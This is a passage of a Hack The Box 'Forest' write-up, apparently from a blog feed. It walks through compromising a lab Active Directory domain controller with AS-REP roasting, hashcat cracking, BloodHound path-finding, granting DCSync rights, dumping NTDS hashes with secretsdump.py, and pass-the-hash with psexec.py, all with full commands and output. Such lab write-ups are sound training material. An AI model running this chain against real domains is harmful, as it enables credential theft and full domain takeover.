</span></span><span class="line"><span class="cl">$ rpcclient -U <span class="s1">&#39;%&#39;</span> <span class="s1">&#39;10.10.10.161&#39;</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt;
</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomusers
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Administrator<span class="o">]</span> rid:<span class="o">[</span>0x1f4<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>Guest<span class="o">]</span> rid:<span class="o">[</span>0x1f5<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>krbtgt<span class="o">]</span> rid:<span class="o">[</span>0x1f6<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>DefaultAccount<span class="o">]</span> rid:<span class="o">[</span>0x1f7<span class="o">]</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>sebastien<span class="o">]</span> rid:<span class="o">[</span>0x479<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>lucinda<span class="o">]</span> rid:<span class="o">[</span>0x47a<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>svc-alfresco<span class="o">]</span> rid:<span class="o">[</span>0x47b<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>andy<span class="o">]</span> rid:<span class="o">[</span>0x47e<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>mark<span class="o">]</span> rid:<span class="o">[</span>0x47f<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>santi<span class="o">]</span> rid:<span class="o">[</span>0x480<span class="o">]</span>
</span></span></code></pre></div><p>I use this blog post from <a href="https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/">SANS</a> as my reference.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-svc-alfresco">Shell as svc-alfresco</h3>
<h4 id="asrep-roasting">ASREP Roasting</h4>
<p>In Active Directory, users with Kerberos pre-authentication disabled are vulnerable to what is known as <strong>AS-REP roasting attack</strong>.</p>
<p>When Kerberos is used as the authentication protocol and the pre-auth is enabled, the client or user must <strong>include a timestamp</strong> encrypted with their password hash for each request they send (KRB_AS_REQ). The server then validates the time** by decrypting the request using the user&rsquo;s password stored in <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">SAM</a>. If it valid, the server will give the user a <em><strong>ticket-granting-ticket</strong></em>  (TGT) along with a session key encrypted with the user&rsquo;s password as the response (KRB_AS_REP).</p>
<p>If the pre-auth is disabled, the timestamp is ignored. As a result, an attacker could send a replay attack or dummy request to obtain the TGT for the said user and brute force it offline (read more about it <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">here</a>).</p>
<blockquote>
<p>**5 minutes is the default tolerance</p>
</blockquote>
<p>Below is the overview of the Kerberos mechanism. The AS-REP roasting process is indicated by the red circle (or oval I guess?).</p>
<center>
<p><div class="img-container"><img src="imgs/55e839a7e034457a922add499992970d.png" alt="1c8adf13109de9cc575c53d4eb659467.png"  /></div>
</p>
<p><small>Taken from &ldquo;Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System&rdquo; by David Freimanis</small></p>
</center>
<p>With<code>GetNPUsers.py</code> from Impacket, I can try AS-REP roasting on the list of users I gathered earlier.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «forest» «10.10.14.116»
</span></span><span class="line"><span class="cl">$ GetNPUsers.py -dc-ip <span class="s1">&#39;10.10.10.171&#39;</span> -request htb.local/ -usersfile users -format
</span></span><span class="line"><span class="cl">Impacket v0.9.20 - Copyright <span class="m">2019</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Name          MemberOf                                                PasswordLastSet             LastLogon
</span></span><span class="line"><span class="cl">      UAC
</span></span><span class="line"><span class="cl">------------  ------------------------------------------------------  --------------------------  --------------------------  --------
</span></span><span class="line"><span class="cl">svc-alfresco  <span class="nv">CN</span><span class="o">=</span>Service Accounts,OU<span class="o">=</span>Security Groups,DC<span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local</span>  2020-03-26 09:40:41.035829  2020-03-26 09:41:40.077493  0x410200
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$23$svc</span>-alfresco@HTB.LOCAL:cf77e95a8a50a6d7b298c46e851e93a7<span class="nv">$ea7045cfe9b7583ebd9ba81934cf51330863f66e8b3c2c542981f6317b851980eae4e1a23048e95003cfb38c692075cabf9e3da009e3b1a0e17a34f6fd5d27aa1869a458faee9eff4bdbf5f5f3aaf826caf7e0326f52a522b630becd8f636b8b2fd11af194a18e86d07ad8a55299739684d8be527a9e75e16480db5177841cc7f54ab98891d1691b6ab7f4cbc576d0036820a6c3e59aeaee32e88628c88929e522af9b98ce169ea3bc369551a2925c76bd64e13a7a312119552dad92e9a43814e9033c5ad7d4d4c9808a968ebcc269a52e1f458a4d98c5d930068c52d15c5385c2d71f90933a</span>
</span></span></code></pre></div><p>The tool captured <code>svc-alfresco</code>’s TGT!</p>
<h4 id="cracking-tgt">Cracking TGT</h4>
<p>The obtained TGT can be cracked with dictionary attack using <code>hashcat</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ hashcat64.exe -m <span class="m">18200</span> svcalfresco.txt rockyou.txt -O
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/54b3a7dbe1c644a98c00a8458e2723ff.png" alt="3fa7dc6810434503007549f8610016fa.png"  /></div>
</p>
<p>The password is <code>s3rvice</code>.</p>
<h4 id="winrm---svc-alfresco">WinRM - svc-alfresco</h4>
<p>User <code>svc-alfresco</code> can login remotely via WinRM using <code>evil-winrm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «forest» «10.10.14.116»
</span></span><span class="line"><span class="cl">$ evil-winrm -i <span class="s1">&#39;10.10.10.161&#39;</span> -u svc-alfresco -p s3rvice
</span></span></code></pre></div><p>User flag is done here.</p>
<center>
<p><div class="img-container"><img src="imgs/image-20210405164859538.png" alt="image-20210405164859538"  /></div>
</p>
</center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="enumeration-with-bloodhound">Enumeration with BloodHound</h4>
<p>BloodHound is a great tool to collect more information about object relationships within Active Directory environment.</p>
<p>First, I’ll host my own shares using <code>smbserver.py</code> from Impacket. This will make it easier for data exfiltration and clean up.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «shares» «10.10.14.116»
</span></span><span class="line"><span class="cl">$ smbserver.py myfj . -smb2support -username iamf -password iamf
</span></span></code></pre></div><p>On Forest, I’ll use my share as a network drive.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nv">$pass</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;belompi&#39;</span> -AsPlainText -Force
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nv">$cred</span> <span class="o">=</span> New-Object System.management.automation.pscredential<span class="o">(</span><span class="s1">&#39;mikun&#39;</span>, <span class="nv">$pass</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> New-PSDrive -Name mikun -PSProvider FileSystem -Credential <span class="nv">$cred</span> -Root <span class="se">\\</span><span class="o">[</span>tun0ip<span class="o">]</span><span class="se">\m</span>yfj
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> mikun:
</span></span></code></pre></div><p>I&rsquo;ve already copied <code>SharpHound.exe</code>, the BloodHound ingestor, to my share.</p>
<center>
<p><div class="img-container"><img src="imgs/80def241b823454fa383ea4c1caabc48.png" alt="4da2b821c626eeaa85eecea39b4c96d7.png"  /></div>
</p>
</center>
<p>I’ll start collecting data with <code>-c all</code> option to collect all.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS mikun:<span class="se">\&gt;</span> .<span class="se">\S</span>harpHound.exe -c all
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/acfc9f4b0e234e03824e901be6c9bae0.png" alt="79cb63de9a27f691e28d80820db1ad3d.png"  /></div>
</p>
<p>After it finishes, I’ll fire up BloodHound GUI and then load the collected data by drag and drop.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «forest» «10.10.14.116»
</span></span><span class="line"><span class="cl">$ neo4j console <span class="p">&amp;</span>
</span></span><span class="line"><span class="cl">→ root@iamf «forest» «10.10.14.116»
</span></span><span class="line"><span class="cl">$ bloodhound --no-sandbox <span class="p">&amp;</span>
</span></span></code></pre></div><p>I marked <code>svc-alfresco</code> as <strong>owned</strong> then used BloodHound pre-built analytics queries “Shortest Path from Owned Principal” to find the shortest path from <code>svc-alfresco</code> to domain admin.</p>
<p><div class="img-container"><img src="imgs/2506f5fa02894bd2b3d1095de0c87dcb.png" alt="210d3c3d6e83c6abadd56212b588b7b0.png"  /></div>
</p>
<p>Path explanation, from top (nearest path to domain admin) to the bottom:</p>
<ul>
<li><code>Exchange Windows Permissions</code> group has <code>WriteDacl</code> permission on AD domain. It simply allows you to <strong>modify the domain object’s permissions</strong>. Users, groups, computers, shares are domain objects.</li>
<li><code>Account Operators</code> group has <code>GenericAll</code> permissions on <code>Exchange Windows Permissions</code> group. It allows you to <strong>modify group membership</strong> like adding/removing a user to/from the group. <code>Account Operators</code> members have the ability to <strong>create a user</strong>.</li>
<li><code>Privileged IT Accounts</code> group has direct membership to the <code>Account Operators</code> group.</li>
<li>User <code>svc-alfresco</code> is a direct member of <code>Service Account</code> group and it has indirect membership to the <code>Privileged IT Accounts</code> and the <code>Account Operators</code> group</li>
</ul>
<p>Based on the path, here are the plans:</p>
<ul>
<li>Leverage <code>Account Operators</code> indirect membership to create a new user and join it to <code>Exchange Windows Permission</code> group</li>
<li>Leverage <code>Exchange Windows Permissions</code> group permission to grant <code>DS-Replication-Get-Changes-All</code> (DCSync) to the new user.</li>
</ul>
<h4 id="credential-dumping-with-dcsync-rights">Credential Dumping with DCSync Rights</h4>
<p>In Forest, I&rsquo;ll have to load <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView.ps1</a> first.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS mikun:<span class="se">\&gt;</span> Import-Module .<span class="se">\p</span>owerview.ps1
</span></span></code></pre></div><p>Then I&rsquo;ll create a new user and join it to the <code>Exchange Windows Permissions</code> group.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS mikun:<span class="se">\&gt;</span> net user mikun password /add /domain
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS mikun:<span class="se">\&gt;</span> net group <span class="s2">&#34;Exchange Windows Permission&#34;</span> /add mikun
</span></span></code></pre></div><p>After that, grant DCSync right t</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS mikun:<span class="se">\&gt;</span> <span class="nv">$pass</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;password&#39;</span> -AsPlainText -Force
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS mikun:<span class="se">\&gt;</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS mikun:<span class="se">\&gt;</span> <span class="nv">$cred</span> <span class="o">=</span> New-Object System.management.automation.pscredential<span class="o">(</span><span class="s1">&#39;mikun&#39;</span>, <span class="nv">$pass</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS mikun:<span class="se">\&gt;</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS mikun:<span class="se">\&gt;</span> Add-DomainObjectAcl -Credential <span class="nv">$cred</span> -TargetIdentity <span class="s2">&#34;DC=htb, DC=local&#34;</span> -PrincipalIdentity mikun -Rights DCSync
</span></span></code></pre></div><p>Now I can use <code>secretsdump.py</code> from Impacket with that user to perform a DCSync attack.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «forest» «10.10.14.116»
</span></span><span class="line"><span class="cl">$ secretsdump.py htb.local/mikun:<span class="s1">&#39;password&#39;</span>@10.10.10.161
</span></span><span class="line"><span class="cl">Impacket v0.9.20 - Copyright <span class="m">2019</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class="line"><span class="cl">htb.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class="line"><span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
</span></span><span class="line"><span class="cl">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span class="line"><span class="cl">... &lt;SNIP&gt; ...
</span></span><span class="line"><span class="cl">htb.local<span class="se">\s</span>ebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
</span></span><span class="line"><span class="cl">htb.local<span class="se">\l</span>ucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
</span></span><span class="line"><span class="cl">htb.local<span class="se">\s</span>vc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
</span></span><span class="line"><span class="cl">htb.local<span class="se">\a</span>ndy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
</span></span><span class="line"><span class="cl">htb.local<span class="se">\m</span>ark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
</span></span><span class="line"><span class="cl">htb.local<span class="se">\s</span>anti:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
</span></span><span class="line"><span class="cl">... &lt;SNIP&gt; ...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
</span></span></code></pre></div><h4 id="psexecpy">psexec.py</h4>
<p>Administrator hash can be used with <code>psexec.py</code> from Impacket to gain shell access (pass-the-hash).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «forest» «10.10.14.116»
</span></span><span class="line"><span class="cl">$ psexec.py -hashes <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6&#39;</span> administrator@10.10.10.161
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/5a2108e444d24cdaa30025943db72b72.png" alt="f5aa475536c65192d37a0278a77646ee.png"  /></div>
</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
